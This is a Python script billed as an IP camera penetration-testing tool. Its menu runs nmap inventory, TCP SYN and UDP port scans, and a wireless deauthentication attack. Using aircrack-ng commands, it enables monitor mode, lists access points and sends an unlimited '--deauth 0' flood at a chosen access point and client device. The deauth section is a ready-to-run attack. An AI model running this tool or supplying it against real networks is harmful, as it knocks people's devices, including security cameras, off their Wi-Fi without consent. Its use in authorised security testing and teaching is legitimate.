import nmap
import subprocess
import os


if not 'SUDO_UID' in os.environ.keys():
    print("This program requires elevated privileges. Please run the program with the 'sudo' command.")
    exit()

nmap_scanner = nmap.PortScanner()

def scan_menu():
    print("Please select the function you would like to run:")
    option = input("""
    1 - Nmap Scan 
    2 - Deauthentication Attack

    Input: """)

    match option:
        case "1":
            print("You have selected: Nmap Scan")
            nmap_scan()
        
        case "2":
            print("You have selected: Deauthentication Attack")
            deauth_attack()

def nmap_scan():
    print("Please select the type of scan:")
    nm_option = input(
    """
    1 - Inventory Scan
    2 - TCP Port Scan
    3 - UDP Port Scan
    4 - Return to main menu
    Input: """)

    match nm_option:

        case "1":
            ip_addr = input("Please enter the IP Address/Subnet of the device or network you wish to scan \n Input:")
            print("You are scanning:", ip_addr)
            nmap_scanner.scan(hosts=ip_addr,arguments='-sP')
            print("Device Information:")
            n=1
            for host in nmap_scanner.all_hosts():
                print("Device No.",n)
                addresses = nmap_scanner[host].get('addresses',{}).get('ipv4')
                vendors = nmap_scanner[host].get('vendor')
                print ("IP and MAC: ", addresses)
                print ("MAC Address and Vendor Information:",vendors,"\n")
                n+=1

        case "2":
            ip_addr = input("Please enter the IP Address or IP Address/Network Mask of the device or network you wish to scan \n Input:")
            print("You are scanning:", ip_addr)
            udp_range = input("Please enter the range of TCP ports you wish to scan. \n Input:")
            print("\n")
            nmap_scanner.scan(hosts=ip_addr,ports=udp_range,arguments='-sS')
            print("Network Device Information:")
            n = 1
            for host in nmap_scanner.all_hosts():
                print("Device No.",n)
                addresses = nmap_scanner[host].get('addresses',{}).get('ipv4')
                try:
                    tcp_ports = list(nmap_scanner[host]['tcp'].keys())
                except KeyError:
                    tcp_ports = "None"
                vendors = nmap_scanner[host].get('vendor')
                #print (nmap_scanner[host])
                print ("IP and MAC: ", addresses)
                print ("Open TCP Ports:",tcp_ports)
                print ("MAC Address and Vendor Information:",vendors,"\n")
                n+=1
    
        case "3":
            ip_addr = input("Please enter the IP Address or IP Address/Network Mask of the device or network you wish to scan \n Input:")
            print("You are scanning:", ip_addr)
            udp_range = input("Please enter the range of UDP ports you wish to scan. \n Input:")
            print("\n")
            nmap_scanner.scan(hosts=ip_addr,ports=udp_range,arguments='-sU')
            print("Network Device Information:")
            n = 1
            for host in nmap_scanner.all_hosts():
                print("Device No.",n)
                addresses = nmap_scanner[host].get('addresses',{}).get('ipv4')
                try:
                    udp_ports = list(nmap_scanner[host]['udp'].keys())
                except KeyError:
                    udp_ports = "None"
                vendors = nmap_scanner[host].get('vendor')
                #print (nmap_scanner[host])
                print ("IP and MAC: ", addresses)
                print ("Open UDP Ports:",udp_ports)
                print ("MAC Address and Vendor Information:",vendors,"\n")
                n+=1
        
        case "4":
            scan_menu()


def deauth_attack():
    print("Please select the action to perform:")
    deauth_option = input(
    """
    1 - Activate Monitor Mode (Required Before Initiating Attack)
    2 - View Access Points and Channels (Requires Monitor Mode)
    3 - Run Deauthentication Attack
    4 - Deactivate Monitor Mode
    5 - Return to main menu

    Input: """)

    match deauth_option:
        case "1":
            iface_name = input("Please enter the interface name of your monitor mode-compatible wifi adapter: \n Input:")
            subprocess.run(["airmon-ng","check","kill"])
            subprocess.run(["airmon-ng","start",iface_name])
            print("Interface now running in monitor mode.")
            deauth_attack()
    
        case "2":
            iface_name = input("Please enter the interface name of your monitor mode-compatible wifi adapter: \n Input:")
            try:
                subprocess.run(["airodump-ng",iface_name])
            except KeyboardInterrupt:
                deauth_attack()
        
        case "3":
            iface_name = input("Please enter the interface name of your monitor mode-compatible wifi adapter: \n Input:")
            ap_mac = input("Please enter the MAC address of the target access point. \n Input:")
            channel_no = input("Please enter the access point channel number: \n Input:")
            device_mac = input("Please enter the MAC address of the target device. \n Input:")
            try:
                subprocess.run(["airmon-ng","start",iface_name,channel_no])
                subprocess.run(["aireplay-ng","--deauth","0","-a",ap_mac,"-c",device_mac,iface_name])
            except KeyboardInterrupt:
                "Stopping deauthentication attacks..."
                deauth_attack()
        
        case "4":
            iface_name = input("Please enter the interface name of your wifi adapter running in monitor mode: \n Input:")
            subprocess.run(["airmon-ng","stop",iface_name])
            print("Monitor mode deactivated. Returning to managed mode.")
            deauth_attack()
        
        case "5":
            scan_menu()


print("---IP Camera Penetration Testing Tool---")

scan_menu()